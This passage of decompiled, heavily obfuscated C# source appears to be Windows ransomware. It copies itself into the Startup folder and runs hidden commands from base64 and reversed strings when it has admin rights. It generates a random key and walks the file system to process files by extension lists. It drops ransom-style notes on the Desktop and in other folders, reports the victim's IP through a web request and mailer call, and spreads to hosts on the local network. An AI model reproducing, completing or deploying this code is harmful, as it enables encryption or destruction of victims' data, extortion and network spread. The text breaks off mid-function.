	public static string nHDSghdRVt;

	public static string rqTGwNbfEDzuKJ;

	public static string OZxqmZhljDlmaG;

	public static string ZsMYnZdnVwqV;

	public static List<string> reXUufgXsSe;

	public static string qgDONLtRygbsG;

	public static string GaDNrTSfQzpgUqH;

	public static string TdPVMWBlICskiYNy;

	public static string MhTWjAitsIWp;

	public static string DoiMAWtIiwp;

	public static string QDnhJthsjzzs;

	public static string qzispebVzedqDCRB;

	public static string jLtzySFoeLi;

	public static string mFSoAGtnwysFKkS;

	public static string nGnfbIaSlSQ;

	public static string bPTrFeZDBqpfq;

	public static string NMckiRPhxOGRrzLib;

	public static string AlZNstgAxgld;

	public static string rnIsguQhwxo;

	public static string oDoDWSVcENgJRt;

	public static string KDDybVhLMhFt;

	public static string RfJkdNJaPK;

	public static string NNTHjyZSeLy;

	public static string XoytfIUFESAvwmbb;

	public static string whnxscRWcwiws;

	public static string JhAPsHLAMSzl;

	public static string cFearGTCmJs;

	public static string bwQdyTlGESFEhTU;

	public static string bCrEAAPvBiMx;

	public static string arrfJwYoVN;

	public static string LLUnvLGxBbyKu;

	public static string MrvhpQshaKLQlY;

	public static string TtiqvzWhaOmd;

	public static string oFiUkFigqDlT;

	public static string[] oVWaGggWhTw;

	public static string znQoURUZOUr;

	public static bool DseMmyGrBoOjezM;

	public static string ybcuACZuGLFlw;

	public static bool OGOvpjxWqYzkk;

	public static bool CqANnTqQFBLbUSD;

	public static bool SzJfxzWWMMuOPI;

	public static bool WSFPVFZwpB;

	public static string DFeZKWhzZEN;

	public static bool sfIQAmNvQu;

	public static bool dRIhxKCOQogmtP;

	public static bool wLWxiQIrycV;

	public static bool NlpTotdSTrdumik;

	public static bool ucaWVFkBOPmIjDGYC;

	public static string kysrHjeTUcgeRT;

	public static bool BvUqKHSXKxudwBWG;

	public static Stopwatch HYUCCpDWTDdNB;

	public static int OePGqyfYpLiYf;

	public static int cLVmkVhYZQAqR;

	public static bool HITrlhSdkRhVnTG;

	public static string cIqGLYlhSzE;

	public static List<string> EByAfHfVeYqK;

	public static List<string> ZuwkpSyTavmCB;

	public static List<string> kboSoGMPqvw;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegated;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate10;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate13;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate14;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate15;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate16;

	[NonSerialized]
	internal static GetString getString_0;

	private static void Main(string[] args)
	{
		if (args.Length == 0 && qzispebVzedqDCRB == getString_0(107396735))
		{
			try
			{
				jnZpVnhRGZ CS_0024_003C_003E8__locals0 = new jnZpVnhRGZ();
				CS_0024_003C_003E8__locals0.qGLzZmNRcXPhs = Process.GetCurrentProcess().ProcessName;
				if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.qGLzZmNRcXPhs) > 1)
				{
					return;
				}
			}
			catch (Exception)
			{
			}
		}
		if (args.Length == 0 && qzispebVzedqDCRB == getString_0(107396735))
		{
			try
			{
				hxiemCpCzxZf.EtDhjBSiFga(gLqfzhShBbsaTtcB);
			}
			catch (Exception)
			{
			}
		}
		try
		{
			if (LLUnvLGxBbyKu == getString_0(107397210))
			{
				Thread thread = new Thread(aFVzuWvvoYQ.xLCDAJJEHMD);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (pbMZgWCLBnFVHk == getString_0(107397210))
		{
			Thread.Sleep(int.Parse(fBftGohOuN));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && OZxqmZhljDlmaG == getString_0(107397210))
		{
			try
			{
				kQnDFKnDEJDi(VrSebPGaWq(getString_0(107397205)));
			}
			catch
			{
			}
		}
		try
		{
			if (htRiLelItyC == getString_0(107397210) && jOPsDhIwkqo.cxWhHAEbMMR())
			{
				new jTgzCArmINf().BrLgMJiobgL(bool_0: false);
				jOPsDhIwkqo.oUlPXiUODZBY();
			}
		}
		catch (Exception)
		{
		}
		if (tMeXcpeYzUQaWO == getString_0(107397210) && jOPsDhIwkqo.cxWhHAEbMMR())
		{
			new jTgzCArmINf().BrLgMJiobgL(bool_0: false);
			new jTgzCArmINf().gGGwGcRhcuAs();
		}
		if (rsKTwFdPlMVyG == getString_0(107397210))
		{
			XYxNcwNKOPNvxzrS.kQhViAayurgy();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107397132);
			string text2 = text + Path.GetFileName(fileName);
			if (lybIEUIMcWIGlnj == getString_0(107397210) && fileName != text2)
			{
				Thread thread2 = new Thread(NQUBbmFZtWNsxh);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (aSWQFrNCstAYl == getString_0(107397210) && mainModule != null && fileName != text2)
			{
				try
				{
					NxdceFBuPpPObn = NEuEljagqCF(0, PJmgaEUVoKPG.Count);
					File.Copy(fileName, text + PJmgaEUVoKPG[NxdceFBuPpPObn], overwrite: true);
					Process.Start(text + PJmgaEUVoKPG[NxdceFBuPpPObn]);
					sYQQGplgMYk();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (fAKdbqEizNC == getString_0(107397210) && DateTime.Now < ftLgdfTDcbcpVyc)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (unMozseWIfNDzIG == getString_0(107397210) && DateTime.Now > NqahqjARwnLy)
			{
				sYQQGplgMYk();
			}
		}
		catch
		{
		}
		DKRPhjgMiUiA();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegated == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegated = delegate
			{
				List<string> gOxsnxWeRPgV = GOxsnxWeRPgV;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
					{
						YIXLlGdULNfSbR(getString_0(107384543), string_0);
					};
				}
				Parallel.ForEach(gOxsnxWeRPgV, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
				List<string> dDFbQjSRQSBi = DDFbQjSRQSBi;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
					{
						YIXLlGdULNfSbR(getString_0(107388421), string_0);
					};
				}
				Parallel.ForEach(dDFbQjSRQSBi, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				List<string> qiqXBfsbeQblN = QiqXBfsbeQblN;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
					{
						YIXLlGdULNfSbR(VrSebPGaWq(getString_0(107384502)), string_0);
					};
				}
				Parallel.ForEach(qiqXBfsbeQblN, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
				if (oFiUkFigqDlT == getString_0(107397210))
				{
					string[] source = oVWaGggWhTw;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
						{
							YIXLlGdULNfSbR(VrSebPGaWq(getString_0(107384502)), getString_0(107384477) + string_0 + getString_0(107384468));
						};
					}
					Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
				}
				if (!ASbXtPMgHzag().Contains(getString_0(107385212)))
				{
					JIJxgqGiTDGj(vvPDaYXldwG);
				}
				else
				{
					List<string> source2 = bousYWjJeLmG;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
						{
							YIXLlGdULNfSbR(VrSebPGaWq(iIncmAQQCyiqzep(getString_0(107384463))), string_0);
						};
					}
					Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
				}
				List<string> ihynlOzkYLrJ = IhynlOzkYLrJ;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string string_0)
					{
						YIXLlGdULNfSbR(VrSebPGaWq(getString_0(107384438)), string_0);
					};
				}
				Parallel.ForEach(ihynlOzkYLrJ, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
				List<string> qfFOzoRRsJbaCSrv = QfFOzoRRsJbaCSrv;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
					{
						YIXLlGdULNfSbR(getString_0(107384453), string_0);
					};
				}
				Parallel.ForEach(qfFOzoRRsJbaCSrv, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegated);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && SzJfxzWWMMuOPI)
			{
				try
				{
					Thread thread4 = new Thread(zegDbRijYBCiLd.ySHXkeKbEzwVA);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			YIXLlGdULNfSbR(getString_0(107397127), VrSebPGaWq(getString_0(107397082)));
			YIXLlGdULNfSbR(getString_0(107397127), VrSebPGaWq(getString_0(107397009)));
			YIXLlGdULNfSbR(VrSebPGaWq(getString_0(107396440)), VrSebPGaWq(getString_0(107396459)));
			YIXLlGdULNfSbR(VrSebPGaWq(getString_0(107396440)), VrSebPGaWq(getString_0(107396329)));
		}
		SecureString secureString = new SecureString();
		if (PuBOGNfOFfnPUU == getString_0(107396735))
		{
			Random random = new Random();
			for (int i = 0; i < 32; i++)
			{
				char value = (char)(random.Next(33, 127) % 255);
				if (Convert.ToInt32(value) != 34 && Convert.ToInt32(value) != 92)
				{
					secureString.AppendChar(Convert.ToChar(value));
				}
				else
				{
					i--;
				}
			}
		}
		else
		{
			KPzELoIiDOIaJ = getString_0(107396667);
		}
		ldoNWMOouzwBgAly = uNKhrFAtKoRBVa.EnHLHyVjWIb(LqlpLVDdUP(secureString));
		if (wLWxiQIrycV)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), kysrHjeTUcgeRT)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), kysrHjeTUcgeRT), string.Concat(VrSebPGaWq(getString_0(107396654)), new WebClient().DownloadString(VrSebPGaWq(getString_0(107396597))), getString_0(107396588), VrSebPGaWq(getString_0(107396583)), DateTime.Now, getString_0(107396588), VrSebPGaWq(getString_0(107396510)), ldoNWMOouzwBgAly));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), kysrHjeTUcgeRT), getString_0(107396485) + ldoNWMOouzwBgAly);
				}
			}
			catch (Exception ex7)
			{
				if (sfIQAmNvQu)
				{
					try
					{
						File.AppendAllText(DFeZKWhzZEN, getString_0(107395944) + ex7.Message + getString_0(107396588));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		RYQnltkFzcgEbq.KrvmONpoByr(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), whnxscRWcwiws), COpkimzmDiT(ldoNWMOouzwBgAly), null, null, getString_0(107395863), getString_0(107395878), null);
		if (AlZNstgAxgld == getString_0(107397210))
		{
			try
			{
				jjRfQBZeoawft();
			}
			catch
			{
			}
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			xizWMiNBHKcp();
		}
		try
		{
			TkTXfdYgVXas(new string[26]
			{
				getString_0(107395829),
				getString_0(107395824),
				getString_0(107395851),
				getString_0(107395846),
				getString_0(107395841),
				getString_0(107395804),
				getString_0(107395799),
				getString_0(107395794),
				getString_0(107395821),
				getString_0(107395816),
				getString_0(107395811),
				getString_0(107395774),
				getString_0(107395769),
				getString_0(107395764),
				getString_0(107395759),
				getString_0(107395786),
				getString_0(107395781),
				getString_0(107395776),
				getString_0(107395739),
				getString_0(107395734),
				getString_0(107395729),
				getString_0(107395756),
				getString_0(107395751),
				getString_0(107395746),
				getString_0(107395709),
				getString_0(107395704)
			}, new string[100]
			{
				getString_0(107395699),
				getString_0(107395726),
				getString_0(107395721),
				getString_0(107395712),
				getString_0(107396187),
				getString_0(107396182),
				getString_0(107396177),
				getString_0(107396204),
				getString_0(107396199),
				getString_0(107396194),
				getString_0(107396157),
				getString_0(107396152),
				getString_0(107396143),
				getString_0(107396170),
				getString_0(107396161),
				getString_0(107396124),
				getString_0(107396119),
				getString_0(107396114),
				getString_0(107396141),
				getString_0(107396136),
				getString_0(107396127),
				getString_0(107396090),
				getString_0(107396085),
				getString_0(107396080),
				getString_0(107396107),
				getString_0(107396102),
				getString_0(107396097),
				getString_0(107396060),
				getString_0(107396055),
				getString_0(107396050),
				getString_0(107396077),
				getString_0(107396072),
				getString_0(107396067),
				getString_0(107396030),
				getString_0(107396021),
				getString_0(107396016),
				getString_0(107396043),
				getString_0(107396038),
				getString_0(107396177),
				getString_0(107396033),
				getString_0(107396199),
				getString_0(107395992),
				getString_0(107395987),
				getString_0(107396014),
				getString_0(107396009),
				getString_0(107396004),
				getString_0(107395999),
				getString_0(107395962),
				getString_0(107395957),
				getString_0(107395952),
				getString_0(107395979),
				getString_0(107395974),
				getString_0(107395969),
				getString_0(107395420),
				getString_0(107395415),
				getString_0(107395410),
				getString_0(107395437),
				getString_0(107395432),
				getString_0(107395423),
				getString_0(107395386),
				getString_0(107395377),
				getString_0(107395396),
				getString_0(107396033),
				getString_0(107395351),
				getString_0(107395374),
				getString_0(107395365),
				getString_0(107395324),
				getString_0(107395315),
				getString_0(107395338),
				getString_0(107395333),
				getString_0(107395292),
				getString_0(107395283),
				getString_0(107395306),
				getString_0(107395301),
				getString_0(107395296),
				getString_0(107395259),
				getString_0(107395254),
				getString_0(107395249),
				getString_0(107395276),
				getString_0(107395267),
				getString_0(107395230),
				getString_0(107395225),
				getString_0(107395220),
				getString_0(107395215),
				getString_0(107395242),
				getString_0(107395233),
				getString_0(107395192),
				getString_0(107395187),
				getString_0(107396067),
				getString_0(107395214),
				getString_0(107395209),
				getString_0(107395204),
				getString_0(107395199),
				getString_0(107395674),
				getString_0(107395665),
				getString_0(107395692),
				getString_0(107395687),
				getString_0(107395646),
				getString_0(107395641),
				getString_0(107395636)
			}, new string[0], LqlpLVDdUP(secureString), getString_0(107395631));
		}
		catch (Exception ex9)
		{
			if (sfIQAmNvQu)
			{
				try
				{
					File.AppendAllText(DFeZKWhzZEN, getString_0(107395650) + ex9.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395625)))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395625));
				streamWriter.WriteLine(VrSebPGaWq(getString_0(107395592)));
				streamWriter.WriteLine(getString_0(107396588));
				streamWriter.WriteLine(VrSebPGaWq(getString_0(107392986)));
				streamWriter.WriteLine(ldoNWMOouzwBgAly);
				if (kzoXfhpDPa == getString_0(107396735))
				{
					streamWriter.WriteLine(getString_0(107396588));
					streamWriter.WriteLine(VrSebPGaWq(getString_0(107392953)) + Convert.ToString(tYmlquEGMxfHN.Count));
				}
				if (HITrlhSdkRhVnTG)
				{
					streamWriter.WriteLine(getString_0(107396588));
					streamWriter.WriteLine(VrSebPGaWq(getString_0(107392908)));
					streamWriter.WriteLine(JVNsUrWNTuwEu.PpPaxJIRqdB());
				}
			}
			else
			{
				string text3 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395625));
				if (!text3.Contains(ldoNWMOouzwBgAly) && !OGOvpjxWqYzkk)
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395625), getString_0(107392363) + ldoNWMOouzwBgAly);
				}
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in GjyUHzrKYHxXFV)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + getString_0(107395625)))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395625), item + getString_0(107395625), overwrite: true);
				}
				else
				{
					string text4 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395625));
					if (!text4.Contains(ldoNWMOouzwBgAly) && !OGOvpjxWqYzkk)
					{
						File.AppendAllText(item + getString_0(107395625), getString_0(107392363) + ldoNWMOouzwBgAly);
					}
				}
			}
			catch (Exception)
			{
			}
			if (!WSFPVFZwpB && num > 10)
			{
				break;
			}
		}
		if (bwQdyTlGESFEhTU == getString_0(107397210))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107392334)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107392334));
					streamWriter2.WriteLine(VrSebPGaWq(getString_0(107392301)));
					streamWriter2.WriteLine(getString_0(107396588));
					streamWriter2.WriteLine(VrSebPGaWq(getString_0(107389083)));
					streamWriter2.WriteLine(ldoNWMOouzwBgAly + VrSebPGaWq(getString_0(107389538)));
					if (kzoXfhpDPa == getString_0(107396735))
					{
						streamWriter2.WriteLine(getString_0(107396588));
						streamWriter2.WriteLine(VrSebPGaWq(getString_0(107389493)) + VrSebPGaWq(getString_0(107392953)) + Convert.ToString(tYmlquEGMxfHN.Count) + VrSebPGaWq(getString_0(107389538)));
					}
					if (HITrlhSdkRhVnTG)
					{
						streamWriter2.WriteLine(getString_0(107396588));
						streamWriter2.WriteLine(VrSebPGaWq(getString_0(107392908)));
						streamWriter2.WriteLine(JVNsUrWNTuwEu.PpPaxJIRqdB());
					}
				}
				else
				{
					string text5 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395625));
					if (!text5.Contains(ldoNWMOouzwBgAly) && !OGOvpjxWqYzkk)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107392334), VrSebPGaWq(getString_0(107389493)) + getString_0(107392363) + ldoNWMOouzwBgAly + VrSebPGaWq(getString_0(107389538)));
					}
				}
			}
			catch
			{
			}
		}
		if (uFmZuDOsFxvzSHoZn == getString_0(107397210))
		{
			try
			{
				if (kzoXfhpDPa == getString_0(107396735))
				{
					JVNsUrWNTuwEu.utQznJGFYcPXpPpc(getString_0(107389432), getString_0(107389427), getString_0(107389446), string.Concat(VrSebPGaWq(getString_0(107396654)), new WebClient().DownloadString(VrSebPGaWq(getString_0(107396597))), getString_0(107389405), VrSebPGaWq(getString_0(107396583)), DateTime.Now, getString_0(107396588), VrSebPGaWq(getString_0(107389400)), Convert.ToString(tYmlquEGMxfHN.Count), getString_0(107396588), VrSebPGaWq(getString_0(107396510)), ldoNWMOouzwBgAly));
				}
				else
				{
					JVNsUrWNTuwEu.utQznJGFYcPXpPpc(getString_0(107389432), getString_0(107389427), getString_0(107389446), string.Concat(VrSebPGaWq(getString_0(107396654)), new WebClient().DownloadString(VrSebPGaWq(getString_0(107396597))), getString_0(107389405), VrSebPGaWq(getString_0(107396583)), DateTime.Now, getString_0(107396588), VrSebPGaWq(getString_0(107389400)), Convert.ToString(tYmlquEGMxfHN.Count), getString_0(107396588), VrSebPGaWq(getString_0(107396510)), ldoNWMOouzwBgAly));
				}
			}
			catch
			{
			}
		}
		if (tTJxXJFQquIto == getString_0(107397210))
		{
			try
			{
				urfOLYMYiRll.LrazwdhXhfMl(new Uri(getString_0(107389383)));
			}
			catch
			{
			}
		}
		if (bwQdyTlGESFEhTU == getString_0(107396735))
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395625)))
				{
					Process.Start(VrSebPGaWq(getString_0(107389382)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395625));
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107392334)))
				{
					Process.Start(VrSebPGaWq(getString_0(107389357)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107392334));
				}
			}
			catch
			{
			}
		}
		if (!string.IsNullOrEmpty(QDnhJthsjzzs))
		{
			try
			{
				File.Delete(QDnhJthsjzzs);
			}
			catch
			{
			}
		}
		if (sfIQAmNvQu)
		{
			try
			{
				File.AppendAllText(DFeZKWhzZEN, getString_0(107389308));
			}
			catch (Exception)
			{
			}
		}
		if (ojvJmSdPPrj == getString_0(107389295))
		{
			sYQQGplgMYk();
		}
	}

	public static void NQUBbmFZtWNsxh()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(VrSebPGaWq(getString_0(107389318)), VrSebPGaWq(getString_0(107388652)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int NEuEljagqCF(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> fOaFHBRQre(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.Contains(getString_0(107388603)) && !text.Contains(getString_0(107388610)) && !text.Contains(getString_0(107388577)) && !text.ToLower().Contains(getString_0(107388528)) && !text.ToLower().Contains(getString_0(107388547)) && !text.Contains(getString_0(107389034)) && !text.Contains(getString_0(107388981)) && !text.ToLower().Contains(getString_0(107388996)) && !text.ToLower().Contains(getString_0(107388951)) && !text.ToLower().Contains(getString_0(107388914)) && !text.ToLower().Contains(getString_0(107388937)) && !text.ToLower().Contains(getString_0(107388888)) && !text.ToLower().Contains(getString_0(107388907)) && !text.ToLower().Contains(getString_0(107388862)) && !text.ToLower().Contains(getString_0(107388873)))
				{
					array = Directory.GetFiles(text);
					goto IL_01f1;
				}
			}
			catch
			{
			}
			continue;
			IL_01f1:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107388816)) && !fileInfo.FullName.Contains(getString_0(107388831)) && !fileInfo.FullName.Contains(getString_0(107388814)) && !fileInfo.FullName.Contains(getString_0(107388253)) && !fileInfo.FullName.Contains(getString_0(107388268)) && !fileInfo.FullName.Contains(getString_0(107388219)) && !fileInfo.FullName.Contains(getString_0(107388234)) && !fileInfo.FullName.Contains(getString_0(107388185)) && !fileInfo.FullName.Contains(getString_0(107388204)) && !fileInfo.FullName.Contains(getString_0(107388151)) && !fileInfo.FullName.ToLower().Contains(getString_0(107388170)) && !fileInfo.FullName.ToLower().Contains(getString_0(107388125)) && !fileInfo.FullName.ToLower().Contains(getString_0(107388140)) && !fileInfo.FullName.ToLower().Contains(getString_0(107388091)) && !fileInfo.FullName.Contains(VrSebPGaWq(getString_0(107388106))) && !fileInfo.FullName.Contains(getString_0(107388049)) && !fileInfo.FullName.Contains(getString_0(107388068)) && !fileInfo.FullName.Contains(getString_0(107388019)) && !fileInfo.FullName.EndsWith(getString_0(107395631)) && !fileInfo.FullName.EndsWith(getString_0(107388506)) && !fileInfo.FullName.EndsWith(getString_0(107388501)) && !fileInfo.FullName.EndsWith(getString_0(107388496)) && !fileInfo.FullName.EndsWith(getString_0(107388523)) && !fileInfo.FullName.Contains(getString_0(107388518)) && !fileInfo.FullName.Contains(whnxscRWcwiws) && !fileInfo.FullName.Contains(DFeZKWhzZEN) && !fileInfo.FullName.Contains(kysrHjeTUcgeRT))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(BMAroKfuhFq) * 1024.0 * 1024.0 && mkEvtBjNwVAcYow == getString_0(107397210))
						{
							list.Add(fileInfo.FullName);
							kTlfEAxiydfET(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && mkEvtBjNwVAcYow == getString_0(107396735))
						{
							list.Add(fileInfo.FullName);
							kTlfEAxiydfET(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static string YIXLlGdULNfSbR(string HyCanJguzsJQdC = "", string QUkSehHXcYN = "")
	{
		string result = getString_0(107389383);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = HyCanJguzsJQdC,
				Arguments = QUkSehHXcYN,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void kQnDFKnDEJDi(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107388469),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string iIncmAQQCyiqzep(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string VrSebPGaWq(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static List<string> JMLcAoNnCKdXe()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		ManagementClass val = new ManagementClass(getString_0(107388484));
		List<string> list = new List<string>();
		try
		{
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					object obj = ((ManagementBaseObject)val2).get_Item(getString_0(107388435));
					list.Add(getString_0(107388458) + val2.get_Path().get_Server() + getString_0(107397132) + obj.ToString()!.Replace(getString_0(107388453), getString_0(107389383)));
				}
				return list;
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch
		{
			return null;
		}
	}

	private static void jjRfQBZeoawft()
	{
		//IL_0947: Unknown result type (might be due to invalid IL or missing references)
		//IL_094e: Expected O, but got Unknown
		//IL_0969: Unknown result type (might be due to invalid IL or missing references)
		//IL_0970: Expected O, but got Unknown
		QtQRYhdehvUXbk();
		bksiKRlToNsI.jQYZolePlVmaQQgs();
		kboSoGMPqvw = bksiKRlToNsI.xLVcoERcsssY();
		List<zSNdYPUzCQfTrGe> list = zSNdYPUzCQfTrGe.mwCQnEBcyuAOCwVP();
		foreach (zSNdYPUzCQfTrGe item in list)
		{
			ZuwkpSyTavmCB.Add(item.IPAddress);
		}
		EByAfHfVeYqK = kboSoGMPqvw.Union(ZuwkpSyTavmCB).ToList();
		foreach (string item2 in EByAfHfVeYqK)
		{
			if ((!item2.StartsWith(getString_0(107388448)) && !item2.StartsWith(getString_0(107388411)) && !item2.StartsWith(getString_0(107388402)) && !item2.StartsWith(getString_0(107389383))) || !bksiKRlToNsI.yXUOPNzIwXy(item2))
			{
				continue;
			}
			try
			{
				if (bCrEAAPvBiMx == getString_0(107397210))
				{
					for (int i = 0; i < bksiKRlToNsI.YruVSpqbZI.Count; i++)
					{
						YIXLlGdULNfSbR(getString_0(107388421), getString_0(107388376) + item2 + getString_0(107388367) + bksiKRlToNsI.YruVSpqbZI[i] + getString_0(107388386) + bksiKRlToNsI.DGrMJBvIrlFsyO[i]);
					}
				}
				else
				{
					YIXLlGdULNfSbR(getString_0(107388421), getString_0(107388376) + item2);
				}
			}
			catch
			{
			}
		}
		try
		{
